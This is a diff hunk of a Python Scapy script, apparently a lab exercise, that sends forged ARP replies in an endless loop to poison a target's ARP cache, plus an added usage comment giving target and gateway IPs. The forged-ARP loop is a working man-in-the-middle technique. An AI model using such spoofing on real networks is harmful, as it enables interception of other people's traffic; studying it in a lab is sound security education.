@@ -11,3 +11,7 @@ arp = ARP(op=2, psrc=sys.argv[1], pdst=sys.argv[2], hwdst=arp_ans[ARP].hwsrc)
 while 1:
     send(arp)
     time.sleep(2)
+
+
+# ex) python work1.py 10.0.2.15 10.0.2.1
+# target IP Gateway IP
